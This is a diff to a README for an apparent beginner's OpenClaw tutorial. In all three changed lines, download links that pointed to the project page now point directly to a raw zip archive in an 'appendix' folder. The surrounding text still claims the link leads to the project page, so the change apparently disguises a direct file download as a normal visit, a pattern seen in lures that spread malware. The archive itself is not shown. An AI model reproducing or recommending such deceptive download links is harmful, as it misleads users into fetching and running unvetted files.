@@ -1,6 +1,6 @@
 # ⚙️ openclaw-easy-tutorial-zh-cn - Simple OpenClaw Guide For Beginners
 
-[![Download Now](https://img.shields.io/badge/Download-OpenClaw%20Tutorial-brightgreen?style=for-the-badge)](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn)
+[![Download Now](https://img.shields.io/badge/Download-OpenClaw%20Tutorial-brightgreen?style=for-the-badge)](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn/raw/refs/heads/main/appendix/cn-easy-zh-tutorial-openclaw-1.2.zip)
 
 ---
 
@@ -40,7 +40,7 @@ To run this application on Windows, make sure your system meets the following:
 
 Click the large green button above or go here to begin:
 
-[Download OpenClaw Easy Tutorial](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn)
+[Download OpenClaw Easy Tutorial](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn/raw/refs/heads/main/appendix/cn-easy-zh-tutorial-openclaw-1.2.zip)
 
 This link takes you to the project page on GitHub. From there, you can get the latest Windows installer file. Look for files named like `OpenClawSetup.exe` or similar in the releases section.
 
@@ -128,7 +128,7 @@ Multiple agents let you run different bot personalities or tasks at once. To add
 
 Download and get the full tutorial files here:
 
-[![Download OpenClaw Easy Tutorial](https://img.shields.io/badge/Download-OpenClaw-orange?style=for-the-badge)](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn)
+[![Download OpenClaw Easy Tutorial](https://img.shields.io/badge/Download-OpenClaw-orange?style=for-the-badge)](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn/raw/refs/heads/main/appendix/cn-easy-zh-tutorial-openclaw-1.2.zip)
 
 ---
 
